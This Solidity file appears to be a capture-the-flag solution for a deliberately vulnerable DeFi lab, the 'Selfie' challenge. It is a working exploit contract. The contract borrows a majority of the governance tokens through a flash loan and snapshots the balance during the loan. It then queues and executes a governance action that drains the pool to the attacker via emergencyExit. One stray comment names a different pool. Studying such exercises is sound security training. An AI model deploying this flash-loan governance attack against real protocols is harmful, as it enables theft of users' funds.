// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./ISimpleGovernance.sol";
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";

// Our contract to spoof TrusterLenderPool
contract GovernanceHack is IERC3156FlashBorrower {
  SelfiePool public selfiePool;
  SimpleGovernance public simpleGovernance;
  DamnValuableTokenSnapshot public selfieToken;
  address public owner;
  uint256 actionId;
  constructor(address payable _selfiePool, address payable _simpleGovernance, address _token) {
    selfiePool = SelfiePool(_selfiePool);
    simpleGovernance = SimpleGovernance(_simpleGovernance);
    selfieToken = DamnValuableTokenSnapshot(_token);

    owner = msg.sender;
  }

  function setupTarget() external {
    // I will flash loan from selfiePool and queueAction on simpleGovernance
    // Need to queue the action of calling selfiePool.emergencyExit(address receiver)
    // with my player/owner as the receiver

    // we will then wait 2 days and call simplegovernance.executeAction w/ the actionId
    // returned from the queing of the action

    require(msg.sender == owner, 'Owner Only');

    // Get flashloan for most of balance of pool, need > 50%
    selfiePool.flashLoan(
      this,
      address(selfieToken),
      selfiePool.maxFlashLoan(address(selfieToken)) - 100,
      "0x00"
    );

    // Setup payload to queue as action using the snapshot 'validity' we just set up
    // in our flashloan
    bytes memory payload = abi.encodeWithSignature("emergencyExit(address)", owner);
    // Queue action to call on selfie pool, no value, data is payload to call on pool
    // Set return as our action ID to call later when we execute
    actionId = simpleGovernance.queueAction(address(selfiePool), 0, payload);

  }

  function onFlashLoan(
    address _initiator,
    address _token,
    uint256 _amount,
    uint256 _fee,
    bytes calldata _data
    ) external returns (bytes32) {
    // Take a snapshot to be the most recent when we have our big balance
    selfieToken.snapshot();
    
    // Handle standard flashloan approve/return val
    selfieToken.approve(address(selfiePool), _amount);

    return keccak256("ERC3156FlashBorrower.onFlashLoan");
  }

  function executeAttack() external {
    require(msg.sender == owner, 'Owner Only');

    // call our action to execute
    bytes memory returnData = simpleGovernance.executeAction(actionId);
  }

  receive() external payable {}

}
